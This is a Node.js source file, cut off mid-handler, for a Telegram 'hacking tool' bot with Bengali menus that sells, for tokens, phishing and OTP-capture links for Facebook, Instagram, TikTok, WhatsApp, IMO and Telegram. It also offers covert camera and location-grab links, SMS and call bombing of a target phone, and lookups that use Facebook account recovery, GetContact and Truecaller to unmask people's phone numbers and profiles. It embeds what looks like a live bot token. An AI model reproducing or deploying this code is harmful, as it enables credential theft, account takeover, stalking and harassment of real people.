'use strict';
// ══════════════════════════════════════════════════════
// HACKING TOOL BOT + BOMBER — full single-file build
// ══════════════════════════════════════════════════════

// ⚠️⚠️ SWAP THESE TWO LINES WITH YOUR REAL VALUES ⚠️⚠️
const TOKEN_PLACEHOLDER    = process.env.TOKEN    || '8788498983:AAFzmfejkwIgCD2HsdLJ1-ZPhMfUd6J7Hso;
const ADMIN_ID_PLACEHOLDER = process.env.ADMIN_ID || '8370261764;
// ══════════════════════════════════════════════════════

const express    = require('express');
const http       = require('http');
const TBot       = require('node-telegram-bot-api');
const multer     = require('multer');
const bodyParser = require('body-parser');
const axios      = require('axios');
const crypto     = require('crypto');
const fs         = require('fs');
const path       = require('path');

const CFG = {
    TOKEN:        TOKEN_PLACEHOLDER,
    ADMIN_ID:     ADMIN_ID_PLACEHOLDER,
    CHANNEL:      process.env.CHANNEL       || 'rakibfxatrading',
    START_IMG:    process.env.START_IMG     || 'https://hc1.checker.in/file2link/photos/file_661524.jpg/file_661524.jpg',
    LURE_VID:     process.env.LURE_VID      || 'http://hc1.checker.in/file2link/videos/file_657140.mp4/',
    PORT:         parseInt(process.env.PORT || '8999'),
    LINK_COST:    5,
    SIGNUP_BONUS: 20,
    REF_BONUS:    15,
    REF_REWARD:   10,
    FREE_REFS:    3,
    LINK_TTL_MS:  72 * 60 * 60 * 1000,
    BASE_URL:     process.env.RENDER_EXTERNAL_URL || '',
    GC_TOKEN:     process.env.GC_TOKEN  || '',
    TC_AUTH:      process.env.TC_AUTH   || '',
    DATA_FILE:    process.env.DATA_FILE || '/tmp/botdata.json',
    BOMB_COST:    parseInt(process.env.BOMB_COST || '10'),
};

// ── Logger ──
const log = {
    _w: (lvl, m) => console.log(`[${new Date().toISOString()}] ${lvl}: ${m}`),
    info:  m => log._w('INFO ', m),
    warn:  m => log._w('WARN ', m),
    error: m => log._w('ERROR', m),
};

// ── Store ──
let store = { users:{}, vip:{}, links:{}, pending:{}, sessions:{}, rate:{} };
const saveStore = () => { try { const t = CFG.DATA_FILE+'.tmp'; fs.writeFileSync(t, JSON.stringify(store), 'utf8'); fs.renameSync(t, CFG.DATA_FILE); } catch(e){ log.warn('[Store] '+e.message); } };
const loadStore = () => { try { if (fs.existsSync(CFG.DATA_FILE)) { store = { ...store, ...JSON.parse(fs.readFileSync(CFG.DATA_FILE,'utf8')) }; log.info('[Store] Loaded'); } } catch(e){ log.warn('[Store] '+e.message); } };
loadStore();
setInterval(saveStore, 60*1000);

function getUser(uid) {
    uid = String(uid);
    if (!store.users[uid]) {
        store.users[uid] = { balance: CFG.SIGNUP_BONUS, refs: 0, refBy: null, lifetime: false, linksMade: 0, joinDate: Date.now(), banned: false };
        saveStore();
    }
    const u = store.users[uid];
    u.isAdmin  = uid === String(CFG.ADMIN_ID);
    u.isVIP    = !!store.vip[uid];
    u.lifetime = !!(u.lifetime || u.isAdmin || u.isVIP);
    return u;
}
const saveUser = () => saveStore();
const isAdmin  = uid => String(uid) === String(CFG.ADMIN_ID);

function checkRate(uid) {
    uid = String(uid);
    if (isAdmin(uid)) return true;
    const now = Date.now(), r = store.rate[uid];
    if (!r || (now - r.windowStart) > 10000) { store.rate[uid] = { count: 1, windowStart: now }; return true; }
    if (r.count >= 5) return false;
    r.count++; return true;
}

function mkLink(action, uid, req) {
    const tok = crypto.randomBytes(16).toString('hex');
    const url = getBase(req) + '/go/' + tok;
    store.links[tok] = { action, uid: String(uid), url, expiresAt: Date.now()+CFG.LINK_TTL_MS, used: false, createdAt: Date.now() };
    const u = getUser(String(uid)); u.linksMade = (u.linksMade||0)+1; saveStore();
    return url;
}
const getLink   = tok => (store.links[tok] && store.links[tok].expiresAt > Date.now()) ? store.links[tok] : null;
const userLinks = uid => Object.values(store.links).filter(l => l.uid === String(uid) && l.expiresAt > Date.now()).sort((a,b) => b.createdAt - a.createdAt).slice(0,20);

const getSession = sid => store.sessions[sid] || {};
const setSession = (sid, data) => { store.sessions[sid] = { ...data, createdAt: Date.now() }; };
const setPending = (uid, type) => { store.pending[String(uid)] = { type, createdAt: Date.now() }; };
const getPending = uid => store.pending[String(uid)] || null;
const delPending = uid => { delete store.pending[String(uid)]; saveStore(); };

function cleanup() {
    const now = Date.now();
    for (const [t,l] of Object.entries(store.links))     if (l.expiresAt < now) delete store.links[t];
    for (const [u,p] of Object.entries(store.pending))   if (now - p.createdAt > 10*60*1000) delete store.pending[u];
    for (const [s,ss] of Object.entries(store.sessions)) if (now - ss.createdAt > 60*60*1000) delete store.sessions[s];
    for (const [u,r] of Object.entries(store.rate))      if (now - r.windowStart > 10000) delete store.rate[u];
    saveStore();
}
setInterval(cleanup, 10*60*1000);

// ── Message queue ──
const msgQueue = []; let queueRunning = false;
function enqueue(fn) { return new Promise((res, rej) => { msgQueue.push({ fn, res, rej }); if (!queueRunning) drainQueue(); }); }
async function drainQueue() { queueRunning = true; while (msgQueue.length) { const { fn, res, rej } = msgQueue.shift(); try { res(await fn()); } catch(e){ rej(e); } await new Promise(r=>setTimeout(r,100)); } queueRunning = false; }

// ── Express + Bot ──
const app    = express();
const server = http.createServer(app);
const upload = multer({ limits:{ fileSize: 50*1024*1024 }, storage: multer.memoryStorage() });
app.use(bodyParser.json({ limit:'50mb' }));
app.use(bodyParser.urlencoded({ extended:true, limit:'50mb' }));

const bot = new TBot(CFG.TOKEN, { polling:{ interval:300, autoStart:true, params:{ timeout:10 } } });
bot.on('polling_error', err => { log.error('[Bot] Poll: '+err.message); if (err.code === 'EFATAL') setTimeout(() => bot.startPolling(), 5000); });
bot.on('error', err => log.error('[Bot] '+err.message));

function getBase(req) {
    if (CFG.BASE_URL) return CFG.BASE_URL;
    if (req) return `${req.protocol}://${req.get('host')}`;
    return `http://localhost:${CFG.PORT}`;
}
const parseCookies = h => (h['set-cookie'] || []).map(c => c.split(';')[0]).join('; ');

const tgMsg = (cid, text, opts = {}) => enqueue(() =>
    bot.sendMessage(cid, (text||'').slice(0,4096), { parse_mode:'HTML', ...opts }).catch(async err => {
        log.warn(`[tgMsg] ${cid}: ${err.message}`);
        if (err.response && err.response.statusCode === 429) {
            const w = (err.response.body && err.response.body.parameters && err.response.body.parameters.retry_after) || 5;
            await new Promise(r => setTimeout(r, w*1000));
            return bot.sendMessage(cid, (text||'').slice(0,4096), { parse_mode:'HTML', ...opts });
        }
    })
);
const tgPic = (cid, buffer, caption) => enqueue(() => bot.sendPhoto(cid, buffer, { caption, parse_mode:'HTML' }).catch(e => log.warn(`[tgPic] ${cid}: ${e.message}`)));
const tgLoc = (cid, lat, lon) => enqueue(() => bot.sendLocation(cid, lat, lon).catch(e => log.warn(`[tgLoc] ${cid}: ${e.message}`)));

async function checkJoin(userId) {
    try { const m = await bot.getChatMember('@'+CFG.CHANNEL, userId); return ['member','administrator','creator'].includes(m.status); } catch(e){ return false; }
}

const actionLabel = act => ({ cam_f:'📷 Front Camera', cam_b:'📷 Back Camera', loc:'📍 Location', phish_fb:'🎣 Facebook', phish_ig:'📸 Instagram', phish_tt:'🎵 TikTok', phish_msgr:'📨 Messenger', phish_wa:'📱 WhatsApp OTP', phish_imo:'💬 IMO OTP', phish_tg:'✈️ Telegram OTP', msgr_info:'💌 Message Info' }[act] || act);

// ── Bomber pool: file OR env ──
const ENDPOINT_FILE = process.env.ENDPOINT_FILE || path.join(__dirname, 'endpoints.json');
let BOMB_POOL = { sms: [], call: [] };
function loadPool() {
    let loaded = false;
    if (process.env.BOMB_ENDPOINTS_JSON) {
        try {
            const raw = JSON.parse(process.env.BOMB_ENDPOINTS_JSON);
            BOMB_POOL.sms  = (raw.sms  || []).filter(e => e && e.url);
            BOMB_POOL.call = (raw.call || []).filter(e => e && e.url);
            loaded = true;
            log.info(`[Bomber] Loaded from env: sms=${BOMB_POOL.sms.length} call=${BOMB_POOL.call.length}`);
        } catch(e){ log.warn('[Bomber] env parse: '+e.message); }
    }
    if (!loaded && fs.existsSync(ENDPOINT_FILE)) {
        try {
            const raw = JSON.parse(fs.readFileSync(ENDPOINT_FILE, 'utf8'));
            BOMB_POOL.sms  = (raw.sms  || []).filter(e => e && e.url);
            BOMB_POOL.call = (raw.call || []).filter(e => e && e.url);
            log.info(`[Bomber] Loaded from file: sms=${BOMB_POOL.sms.length} call=${BOMB_POOL.call.length}`);
            loaded = true;
        } catch(e){ log.warn('[Bomber] file parse: '+e.message); }
    }
    if (!loaded) {
        log.warn('[Bomber] No pool loaded. Run: node collector.js +8801712345678');
    }
}
loadPool();

function pickEndpoint(type, excludeIdx) {
    const list = BOMB_POOL[type]; if (!list.length) return null;
    for (let i=0;i<5;i++){ const idx = crypto.randomInt(0,list.length); if (idx !== excludeIdx) return { endpoint: list[idx], idx }; }
    return { endpoint: list[0], idx: 0 };
}
const renderTpl = (tpl, vars) => tpl.replace(/\{(\w+)\}/g, (_, k) => vars[k] != null ? encodeURIComponent(vars[k]) : '');
const sleep = ms => new Promise(r => setTimeout(r, ms));

async function fireOne(endpoint, phone, rand) {
    const url = renderTpl(endpoint.url, { phone, rand, cc: endpoint.cc || '' });
    const method = (endpoint.method || 'GET').toUpperCase();
    const headers = endpoint.headers || { 'User-Agent': 'Mozilla/5.0 (Linux; Android 13)' };
    const timeout = endpoint.timeout || 8000;
    try {
        const r = method === 'POST'
            ? await axios.post(url, endpoint.body ? renderTpl(endpoint.body, { phone, rand }) : '', { headers, timeout, validateStatus: () => true })
            : await axios.get(url, { headers, timeout, validateStatus: () => true });
        const httpOk = r.status >= 200 && r.status < 400;
        const bodyStr = typeof r.data === 'string' ? r.data : JSON.stringify(r.data || '');
        const hit = endpoint.successKeyword ? bodyStr.includes(endpoint.successKeyword) : httpOk;
        return { ok: hit, status: r.status, endpoint: endpoint.name || url };
    } catch (e) {
        return { ok: false, status: 0, error: e.code || e.message, endpoint: endpoint.name || url };
    }
}

async function bomb(type, phone, opts = {}) {
    const rounds   = Math.max(1, Math.min(opts.rounds || 5, 50));
    const delayMs  = Math.max(0, Math.min(opts.delay || 300, 5000));
    const hitGoal  = Math.max(1, opts.hits || 10);
    const parallel = Math.max(1, Math.min(opts.parallel || 3, 20));
    const result = { sent: 0, hits: 0, fails: 0, log: [] };
    const start = Date.now();
    for (let round=0; round<rounds; round++) {
        if (result.hits >= hitGoal) break;
        const batch = [];
        for (let p=0; p<parallel; p++) {
            const pick = pickEndpoint(type); if (!pick) break;
            batch.push(fireOne(pick.endpoint, phone, crypto.randomBytes(4).toString('hex')));
        }
        for (const r of await Promise.all(batch)) {
            result.sent++;
            if (r.ok) { result.hits++; result.log.push(`✅ ${r.endpoint}`); }
            else      { result.fails++; result.log.push(`❌ ${r.endpoint} (${r.status || r.error})`); }
        }
        if (delayMs) await sleep(delayMs);
    }
    result.elapsed = Date.now() - start;
    return result;
}

// ── Lookup engines (unchanged) ──
const safeGet  = async (url, opts={}, lbl='') => { try { return await axios.get(url,{ timeout:10000, ...opts }); } catch(e){ log.warn(`[${lbl}] ${e.message}`); return null; } };
const safePost = async (url, data, opts={}, lbl='') => { try { return await axios.post(url, data, { timeout:10000, ...opts }); } catch(e){ log.warn(`[${lbl}] ${e.message}`); return null; } };

async function lookupTgUsername(username) {
    username = username.replace(/^@/,'').trim().toLowerCase();
    const res = { username, id:null, name:null, bio:null, phone:null, phoneSource:null, sources:[] };
    const tm = await safeGet(`https://t.me/${username}`, { headers:{'User-Agent':'TelegramBot/1.0'} }, 'tme');
    if (tm) {
        const nm = tm.data.match(/<meta property="og:title" content="([^"]+)"/);
        const bm = tm.data.match(/<meta property="og:description" content="([^"]+)"/);
        if (nm) res.name = nm[1]; if (bm) res.bio = bm[1]; res.sources.push('t.me');
    }
    const fr = await safeGet(`https://fragment.com/username/${encodeURIComponent(username)}`, { headers:{'User-Agent':'Mozilla/5.0'} }, 'fragment');
    if (fr) {
        const idM = fr.data.match(/"peer_id":(\d+)/); if (idM && !res.id) { res.id = idM[1]; res.sources.push('Fragment'); }
        const phM = fr.data.match(/\+\d[\d\s\-()]{6,14}\d/g); if (phM && !res.phone) { res.phone = phM[0].replace(/\s/g,''); res.phoneSource='Fragment'; res.sources.push('Fragment Phone'); }
    }
    const tg = await safeGet(`https://tgstat.com/channel/@${username}`, { headers:{'User-Agent':'Mozilla/5.0'} }, 'tgstat');
    if (tg && !res.id) { const m = tg.data.match(/tg:\/\/user\?id=(\d+)/); if (m) { res.id = m[1]; res.sources.push('TGStat'); } }
    if (!res.phone && CFG.GC_TOKEN) {
        const gc = await safePost('https://pbhs2.getcontact.com/profile/v3/search',
            { query: username, countryCode:'BD', source:'SEARCH' },
            { headers:{ 'Authorization':`Bearer ${CFG.GC_TOKEN}`, 'User-Agent':'GetContact/7.0.0 (Android 13)', 'Content-Type':'application/json', 'x-client-version':'7.0.0' }}, 'getcontact');
        if (gc && gc.data && gc.data.result) {
            const profs = gc.data.result.profiles || (Array.isArray(gc.data.result) ? gc.data.result : [gc.data.result]);
            for (const p of profs) { const ph = p.phone || p.phoneNumber; if (ph) { res.phone = ph.startsWith('+') ? ph : '+'+ph; res.phoneSource='GetContact'; res.sources.push('GetContact'); break; } }
        }
    }
    if (!res.phone && CFG.TC_AUTH && res.name) {
        const tc = await safeGet(`https://search5-noneu.truecaller.com/v2/search?q=${encodeURIComponent(res.name)}&countryCode=BD&type=4&placement=SEARCHRESULTS,APP,FALSE&encoding=json`,
            { headers:{ 'Authorization': CFG.TC_AUTH, 'User-Agent':'Truecaller/13.0.0 (Android 13)', 'Accept':'application/json' }}, 'tc');
        if (tc && tc.data && tc.data.data && tc.data.data.length) {
            for (const e of tc.data.data) { if (e.phones && e.phones.length) { res.phone = e.phones[0].e164Format || e.phones[0].nationalFormat; res.phoneSource='Truecaller'; res.sources.push('Truecaller'); break; } }
        }
    }
    return res;
}

async function lookupFbByPhone(phone) {
    phone = phone.trim().replace(/[\s\-()]/g,'');
    if (!phone.startsWith('+')) phone = '+880'+phone.replace(/^0+/,'');
    const res = { phone, id:null, name:null, profileUrl:null, email:null, sources:[] };
    try {
        const pg = await safeGet('https://www.facebook.com/login/identify/', { headers:{ 'User-Agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15', 'Accept-Language':'en-US,en;q=0.9' }, maxRedirects:5 }, 'fb-pg');
        if (pg) {
            const cookies = parseCookies(pg.headers);
            const lsdM = pg.data.match(/"LSD",\[\],{"token":"([^"]+)"/); const lsd = lsdM ? lsdM[1] : '';
            const dtsgM = pg.data.match(/name="fb_dtsg" value="([^"]+)"/) || pg.data.match(/"dtsg":\{"token":"([^"]+)"/); const dtsg = dtsgM ? dtsgM[1] : '';
            const init = await safePost('https://www.facebook.com/ajax/recover/initiate/',
                new URLSearchParams({ lsd, email_or_phone:phone, did_login:'0', fur_initiated:'0', action:'initiate', fb_dtsg:dtsg }).toString(),
                { headers:{ 'Content-Type':'application/x-www-form-urlencoded', 'User-Agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)', 'Cookie':cookies, 'X-Requested-With':'XMLHttpRequest', 'Referer':'https://www.facebook.com/login/identify/', 'Origin':'https://www.facebook.com' }}, 'fb-recover');
            if (init) {
                const raw = init.data.replace(/^[^{\[]*(?=[{\[])/,'');
                for (const pat of [/["']?uid["']?:\s*["']?(\d{5,})["']?/, /["']?account_id["']?:\s*["']?(\d{5,})["']?/, /profile\.php\?id=(\d{5,})/, /\/(\d{10,})\/picture/]) { const m = raw.match(pat); if (m) { res.id = m[1]; break; } }
                const nm = raw.match(/"(?:name|display_name)":"([^"\\]+)"/); const em = raw.match(/[\w.+]+\*+[\w.]*@[\w.]+/);
                if (nm) res.name = nm[1].replace(/\\u([\dA-F]{4})/gi, (_,c)=>String.fromCharCode(parseInt(c,16)));
                if (em) res.email = em[0];
                if (res.id) { res.profileUrl = `https://www.facebook.com/profile.php?id=${res.id}`; res.sources.push('FB Recovery'); }
            }
        }
    } catch(e){ log.warn('[FB] '+e.message); }
    if (CFG.GC_TOKEN && !res.name) {
        const gc = await safePost('https://pbhs2.getcontact.com/profile/v3/search',
            { query:phone, countryCode:'BD', source:'PHONE' },
            { headers:{ 'Authorization':`Bearer ${CFG.GC_TOKEN}`, 'User-Agent':'GetContact/7.0.0 (Android 13)', 'Content-Type':'application/json' }}, 'gc-rev');
        if (gc && gc.data && gc.data.result) { const n = gc.data.result.displayName || gc.data.result.name; if (n) { res.name = n; res.sources.push('GetContact'); } }
    }
    if (CFG.TC_AUTH && !res.name) {
        const tc = await safeGet(`https://search5-noneu.truecaller.com/v2/search?q=${encodeURIComponent(phone)}&countryCode=BD&type=4&placement=SEARCHRESULTS,APP,FALSE&encoding=json`,
            { headers:{ 'Authorization': CFG.TC_AUTH, 'User-Agent':'Truecaller/13.0.0 (Android 13)' }}, 'tc-phone');
        if (tc && tc.data && tc.data.data && tc.data.data.length) { const n = tc.data.data[0].name; if (n) { res.name = n; res.sources.push('Truecaller'); } }
    }
    if (!res.id && res.name) {
        const ms = await safeGet(`https://m.facebook.com/search/people/?q=${encodeURIComponent(res.name)}&ref=comet_topbar`,
            { headers:{ 'User-Agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)', 'Accept-Language':'en-US' }}, 'fb-search');
        if (ms) { const m = ms.data.match(/profile\.php\?id=(\d{10,})/) || ms.data.match(/"userID":"(\d{10,})"/); if (m) { res.id = m[1]; res.profileUrl = `https://www.facebook.com/profile.php?id=${res.id}`; res.sources.push('FB Name Search'); } }
    }
    if (!res.id) {
        const gp = await safeGet(`https://graph.facebook.com/v18.0/?id=${encodeURIComponent(phone)}&fields=id,name`, { headers:{ 'User-Agent':'Mozilla/5.0' }}, 'graph');
        if (gp && gp.data && gp.data.id) { res.id = gp.data.id; res.name = res.name || gp.data.name || null; res.profileUrl = `https://www.facebook.com/profile.php?id=${res.id}`; res.sources.push('Graph'); }
    }
    return res;
}

// ── Keyboards ──
const startKb = uid => ({ inline_keyboard: [[{ text:'📢 Join Our Channel', url:'https://t.me/'+CFG.CHANNEL }],[{ text:'✅ Verify & Get Access', callback_data:'VERIFY_'+uid }]] });
const backKb  = { inline_keyboard: [[{ text:'◀️ Main Menu', callback_data:'M_BACK' }]] };
function mainKb(uid) {
    const kb = [
        [{ text:'📷 Front Camera',        callback_data:'LNK_cam_f'      }, { text:'📷 Back Camera',    callback_data:'LNK_cam_b'     }],
        [{ text:'📍 Location Tracker',    callback_data:'LNK_loc'         }],
        [{ text:'🎣 Facebook',             callback_data:'LNK_phish_fb'   }, { text:'📸 Instagram',      callback_data:'LNK_phish_ig'  }],
        [{ text:'🎵 TikTok',               callback_data:'LNK_phish_tt'   }, { text:'📨 Messenger',      callback_data:'LNK_phish_msgr'}],
        [{ text:'📱 WhatsApp OTP',         callback_data:'LNK_phish_wa'   }, { text:'💬 IMO OTP',        callback_data:'LNK_phish_imo' }],
        [{ text:'✈️ Telegram OTP',         callback_data:'LNK_phish_tg'   }],
        [{ text:'🔍 TG Username → Phone',  callback_data:'LOOKUP_TG'      }, { text:'🔍 Phone → FB ID',  callback_data:'LOOKUP_FB'     }],
        [{ text:'💌 Message Info Link',    callback_data:'LNK_msgr_info'  }],
        [{ text:'📨 SMS Bomber',           callback_data:'BOMB_SMS'       }, { text:'📞 Call Bomber',    callback_data:'BOMB_CALL'     }],
        [{ text:'📂 Link Manager',         callback_data:'LINK_MGR'       }, { text:'💰 My Balance',     callback_data:'BALANCE'       }],
        [{ text:'🔗 Referral Link',        callback_data:'REFERRAL'       }, { text:'❓ How To Use',     callback_data:'HOW_TO'        }],
    ];
    if (isAdmin(uid)) kb.push([{ text:'👑 VIP Manager', callback_data:'VIP_MGR' }, { text:'📊 Stats', callback_data:'STATS' }]);
    return { inline_keyboard: kb };
}
const linkKb = d => ({ inline_keyboard: [[{ text:'📋 Copy Link', callback_data:'COPY_'+d }, { text:'🔄 New Link', callback_data:d }],[{ text:'📂 Link Manager', callback_data:'LINK_MGR' }, { text:'◀️ Main Menu', callback_data:'M_BACK' }]] });

// ── /start ──
bot.onText(/\/start(?:\s+(.+))?/, async msg => {
    const cid = String(msg.chat.id);
    const name = msg.from.first_name || 'বন্ধু';
    const arg = (msg.text.split(' ')[1] || '').trim();
    const isNew = !store.users[cid];
    const u = getUser(cid);
    if (u.banned) return;
    if (isNew && arg && arg !== cid && store.users[arg]) {
        const ref = store.users[arg];
        if (!ref.banned) {
            u.refBy = arg; u.balance += CFG.REF_BONUS;
            ref.refs = (ref.refs || 0) + 1; ref.balance = (ref.balance || 0) + CFG.REF_REWARD;
            if (ref.refs >= CFG.FREE_REFS) ref.lifetime = true;
            saveStore();
            tgMsg(arg, `🎉 <b>New Referral!</b>\n💰 +${CFG.REF_REWARD} Tokens\n🏆 Total: <b>${ref.refs}</b>\n${ref.lifetime ? '\n🎊 <b>Lifetime Free!</b>' : `\n🔄 <b>${CFG.FREE_REFS - ref.refs}</b> more`}`);
        }
    }
    const caption = `🔥 <b>স্বাগতম, ${name}!</b> 🔥\n\n┌─────────────────────────┐\n│  🛠️  <b>HACKING TOOL BOT</b>  🛠️  │\n└─────────────────────────┘\n\n🎯 <b>Tools:</b>\n├ 📷 Camera\n├ 📍 Location\n├ 🎣 Phishing (FB · IG · TT · Msgr)\n├ 📱 Real OTP (WA · IMO · TG)\n├ 🔍 TG Username → Phone\n├ 🔍 Phone → FB ID\n├ 📨 SMS Bomber\n├ 📞 Call Bomber\n└ 💌 Messenger Info\n\n━━━━━━━━━━━━━━━━━━━━━━━━\n🎁 <b>Signup Bonus: +${CFG.SIGNUP_BONUS} Tokens!</b>\n━━━━━━━━━━━━━━━━━━━━━━━━\n\n⚠️ <b>শুরু করতে:</b>\n1️⃣ চ্যানেলে জয়েন করুন\n2️⃣ <b>✅ Verify &amp; Get Access</b> ট্যাপ করুন\n3️⃣ মেইন মেনু আনলক! 🔓`;
    try { await bot.sendPhoto(cid, CFG.START_IMG, { caption, parse_mode:'HTML', reply_markup:startKb(cid) }); }
    catch(e){ tgMsg(cid, caption, { reply_markup:startKb(cid) }); }
});

bot.onText(/\/menu/, async msg => {
    const cid = String(msg.chat.id); const u = getUser(cid);
    if (u.banned) return;
    if (!isAdmin(cid) && !(await checkJoin(cid))) return tgMsg(cid, '⛔ আগে চ্যানেলে জয়েন করুন।', { reply_markup:startKb(cid) });
    sendMainMenu(cid);
});

// ── Admin commands ──
bot.onText(/\/addvip\s+(\d+)/, async msg => {
    if (!isAdmin(msg.chat.id)) return;
    const tid = msg.text.split(' ')[1];
    store.vip[tid] = true; getUser(tid).lifetime = true; saveStore();
    tgMsg(msg.chat.id, `👑 VIP granted: <code>${tid}</code>`);
    tgMsg(tid, '🎊 <b>Lifetime Free Access!</b>').catch(()=>{});
});
bot.onText(/\/removevip\s+(\d+)/, async msg => {
    if (!isAdmin(msg.chat.id)) return;
    const tid = msg.text.split(' ')[1]; delete store.vip[tid];
    if (store.users[tid]) store.users[tid].lifetime = false;
    saveStore(); tgMsg(msg.chat.id, `🗑️ VIP removed: <code>${tid}</code>`);
});
bot.onText(/\/ban\s+(\d+)/, async msg => { if (!isAdmin(msg.chat.id)) return; getUser(msg.text.split(' ')[1]).banned = true; saveStore(); tgMsg(msg.chat.id, `🔨 Banned: <code>${msg.text.split(' ')[1]}</code>`); });
bot.onText(/\/unban\s+(\d+)/, async msg => { if (!isAdmin(msg.chat.id)) return; getUser(msg.text.split(' ')[1]).banned = false; saveStore(); tgMsg(msg.chat.id, `✅ Unbanned: <code>${msg.text.split(' ')[1]}</code>`); });
bot.onText(/\/addbal\s+(\d+)\s+(\d+)/, async msg => { if (!isAdmin(msg.chat.id)) return; const [,tid,amt] = msg.text.split(' '); getUser(tid).balance = (getUser(tid).balance||0)+parseInt(amt); saveStore(); tgMsg(msg.chat.id, `💰 +${amt} to <code>${tid}</code>`); });
bot.onText(/\/stats/, async msg => {
    if (!isAdmin(msg.chat.id)) return;
    const mem = process.memoryUsage();
    tgMsg(msg.chat.id, `📊 <b>Stats</b>\n👥 Users: <b>${Object.keys(store.users).length}</b>\n👑 VIP: <b>${Object.keys(store.vip).length}</b>\n🔗 Links: <b>${Object.values(store.links).filter(l=>l.expiresAt>Date.now()).length}</b>\n💾 Mem: <b>${Math.round(mem.heapUsed/1024/1024)}MB</b>\n⏱️ Up: <b>${Math.floor(process.uptime()/60)} min</b>\n📨 Bomb S=<b>${BOMB_POOL.sms.length}</b> C=<b>${BOMB_POOL.call.length}</b>`);
});
bot.onText(/\/broadcast\s+(.+)/s, async msg => {
    if (!isAdmin(msg.chat.id)) return;
    const text = msg.text.replace('/broadcast ','').trim();
    let sent = 0, failed = 0;
    for (const uid of Object.keys(store.users)) {
        if (store.users[uid].banned) continue;
        try { await tgMsg(uid, `📢 <b>Announcement</b>\n\n${text}`); sent++; } catch { failed++; }
    }
    tgMsg(msg.chat.id, `📢 Done: ✅ ${sent} | ❌ ${failed}`);
});
bot.onText(/\/reloadbomb/, async msg => {
    if (!isAdmin(msg.chat.id)) return;
    loadPool();
    tgMsg(msg.chat.id, `🔄 Pool reloaded: S=${BOMB_POOL.sms.length} C=${BOMB_POOL.call.length}`);
});
bot.onText(/\/collect(?:\s+(.+))?/, async msg => {
    if (!isAdmin(msg.chat.id)) return;
    const phone = (msg.text.split(' ')[1] || '').trim();
    if (!phone) return tgMsg(msg.chat.id, '❌ Usage: <code>/collect +8801712345678</code>');
    tgMsg(msg.chat.id, `⏳ Running collector for +${phone.replace(/^\+/,'')}... this takes ~30s.`);
    try {
        const { execSync } = require('child_process');
        const out = execSync(`node collector.js ${phone}`, { cwd: __dirname, timeout: 180000, encoding: 'utf8' });
        loadPool();
        tgMsg(msg.chat.id, `✅ Collector done.\n<pre>${out.slice(-2000)}</pre>\n\n🔄 Pool: S=${BOMB_POOL.sms.length} C=${BOMB_POOL.call.length}`);
    } catch (e) {
        tgMsg(msg.chat.id, `❌ Collector error: ${e.message}`);
    }
});

async function sendMainMenu(cid) {
    const u = getUser(String(cid));
    await tgMsg(cid, `🛠️ <b>MAIN MENU</b>\n\n┌────────────────────────────────┐\n│  📊 <b>Account</b>                        │\n│  💰 Balance:   <b>${u.balance} Tokens</b>         │\n│  🏆 Referrals: <b>${u.refs || 0}/${CFG.FREE_REFS}</b>            │\n│  ♾️ Lifetime:  <b>${u.lifetime ? '✅ Active' : '❌ Not Yet'}</b>       │\n${u.isAdmin ? '│  👑 Admin                          │\n' : ''}└────────────────────────────────┘\n\n📌 <b>Tools:</b>\n├ 📷 Camera / 📍 Location\n├ 🎣 Phishing FB/IG/TT/Msgr\n├ 📱 OTP WA/IMO/TG\n├ 🔍 TG Lookup / FB Lookup\n├ 📨 SMS Bomb — <b>${CFG.BOMB_COST} tokens</b>\n├ 📞 Call Bomb — <b>${CFG.BOMB_COST} tokens</b>\n└ 💌 Msg Info\n\n💡 Link: <b>${CFG.LINK_COST}</b> | Refer <b>${CFG.FREE_REFS}</b> → ♾️ Free`, { reply_markup: mainKb(String(cid)) });
}

// ── Callbacks ──
bot.on('callback_query', async cbq => {
    const uid = String(cbq.from.id), chatId = cbq.message.chat.id, msgId = cbq.message.message_id;
    const data = cbq.data, name = cbq.from.first_name || 'Friend';
    if (!checkRate(uid)) return bot.answerCallbackQuery(cbq.id, { text:'⚠️ Too fast!', show_alert:true }).catch(()=>{});
    bot.answerCallbackQuery(cbq.id).catch(()=>{});
    const del = () => bot.deleteMessage(chatId, msgId).catch(()=>{});
    const u = getUser(uid);
    if (u.banned) return;

    try {
        if (data.startsWith('VERIFY_')) {
            const joined = await checkJoin(uid);
            if (!joined) return bot.answerCallbackQuery(cbq.id, { text:'⛔ Join channel first!', show_alert:true }).catch(()=>{});
            del();
            await tgMsg(chatId, `✅ <b>Verified!</b>\n🎉 Welcome, <b>${name}</b>!\n🎁 <b>+${CFG.SIGNUP_BONUS} Tokens</b>`);
            return sendMainMenu(chatId);
        }
        if (data === 'M_BACK' || data === 'ROUTE_HACK') { del(); delPending(uid); return sendMainMenu(chatId); }
        if (data === 'LOOKUP_TG') { del(); setPending(uid, 'tg_username'); return tgMsg(chatId, `🔍 <b>TG Username → Phone</b>\n\nSend <code>@username</code>:`, { reply_markup:{ inline_keyboard:[[{ text:'❌ Cancel', callback_data:'M_BACK' }]] }}); }
        if (data === 'LOOKUP_FB') { del(); setPending(uid, 'fb_phone'); return tgMsg(chatId, `🔍 <b>Phone → Facebook ID</b>\n\nSend <code>+8801XXXXXXXXX</code>:`, { reply_markup:{ inline_keyboard:[[{ text:'❌ Cancel', callback_data:'M_BACK' }]] }}); }
        if (data === 'BOMB_SMS' || data === 'BOMB_CALL') {
            const isSms = data === 'BOMB_SMS';
            if (!u.lifetime && (u.balance || 0) < CFG.BOMB_COST) {
                del();
                return tgMsg(chatId, `❌ <b>Insufficient Tokens!</b>\n💰 ${u.balance || 0} | Need: ${CFG.BOMB_COST}`, { reply_markup:{ inline_keyboard:[[{ text:'🔗 Referral', callback_data:'REFERRAL' }],[{ text:'◀️ Menu', callback_data:'M_BACK' }]] }});
            }
            del(); setPending(uid, isSms ? 'bomb_sms_phone' : 'bomb_call_phone');
            return tgMsg(chatId, `${isSms ? '📨' : '📞'} <b>${isSms ? 'SMS' : 'Call'} Bomber</b>\n\n📱 Target:\n<code>+8801XXXXXXXXX</code>\n\n💡 Format: <code>PHONE [ROUNDS] [DELAY] [HITS]</code>\n   e.g. <code>+8801712345678 10 200 20</code>\n   Default: <code>5 300 10</code>\n\n💰 Cost: <b>${CFG.BOMB_COST} tokens</b>\n📊 Pool: <b>${isSms ? BOMB_POOL.sms.length : BOMB_POOL.call.length}</b>`, { reply_markup:{ inline_keyboard:[[{ text:'❌ Cancel', callback_data:'M_BACK' }]] }});
        }
